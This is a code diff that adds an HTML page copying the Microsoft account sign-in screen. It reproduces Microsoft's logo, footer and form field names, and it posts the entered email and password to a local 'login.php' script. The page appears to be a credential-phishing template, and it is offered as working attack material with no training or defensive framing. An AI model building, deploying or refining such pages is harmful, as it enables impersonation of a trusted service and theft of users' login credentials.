@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+    <script src="https://unpkg.com/feather-icons"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f8f8f8;
+        }
+        .microsoft-logo {
+            width: 108px;
+            height: 23px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDggMjMiPjxwYXRoIGZpbGw9IiNmMjVkMWIiIGQ9Ik0wIDBIMjN2MjNIMHoiLz48cGF0aCBmaWxsPSIjN2ZiYjAwIiBkPSJNMjYgMEg0OXYyM0gyNnoiLz48cGF0aCBmaWxsPSIjMDBhOGY0IiBkPSJNNTIgMEg3NXYyM0g1MnoiLz48cGF0aCBmaWxsPSIjMDA3OGRjIiBkPSJNNzggMEgxMDh2MjNINzh6Ii8+PC9zdmc+');
+            background-repeat: no-repeat;
+        }
+        .form-container {
+            box-shadow: 0 0 2px rgba(0,0,0,0.12), 0 2px 4px rgba(0,0,0,0.14);
+        }
+        .next-btn {
+            background: linear-gradient(to bottom, #0078d4, #106ebe);
+        }
+        .next-btn:hover {
+            background: linear-gradient(to bottom, #106ebe, #005a9e);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center bg-gray-50">
+    <div class="w-full max-w-md">
+        <div class="text-center mb-8">
+            <img src="m365.png" alt="Microsoft Logo" class="mx-auto mb-4" style="width: 160px; height: 40px;">
+            <h1 class="text-2xl font-semibold text-gray-800">Sign in</h1>
+        </div>
+
+        <div class="bg-white rounded-lg form-container p-8">
+            <form action="login.php" method="POST" class="space-y-6">
+                <div>
+                    <label for="loginfmt" class="block text-sm font-medium text-gray-700 mb-1">Email, phone, or Skype</label>
+                    <input type="text" id="loginfmt" name="loginfmt" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="username">
+                </div>
+
+                <div>
+                    <div class="flex justify-between items-center mb-1">
+                        <label for="passwd" class="block text-sm font-medium text-gray-700">Password</label>
+                        <a href="#" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
+                    </div>
+                    <input type="password" id="passwd" name="passwd" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="current-password">
+                </div>
+
+                <div class="flex items-center">
+                    <input id="KMSI" name="KMSI" type="checkbox" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                    <label for="KMSI" class="ml-2 block text-sm text-gray-700">Keep me signed in</label>
+                </div>
+
+                <div class="space-y-4">
+                    <button type="submit" class="w-full py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white next-btn focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
+                        Sign in
+                    </button>
+                    <a href="#" class="w-full flex items-center justify-center px-4 py-2 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
+                        <i data-feather="arrow-left" class="w-4 h-4 mr-2"></i> Back
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <div class="mt-8 text-center text-sm text-gray-500">
+            <p>No account? <a href="#" class="text-blue-600 hover:underline">Create one!</a></p>
+        </div>
+
+        <div class="mt-8 text-center text-xs text-gray-400">
+            <div class="flex justify-center space-x-4">
+                <a href="#" class="hover:underline">Terms of use</a>
+                <a href="#" class="hover:underline">Privacy & cookies</a>
+            </div>
+            <p class="mt-2">© Microsoft 2023</p>
+        </div>
+    </div>
+
+    <script>
+        feather.replace();
+    </script>
+</body>
+</html>
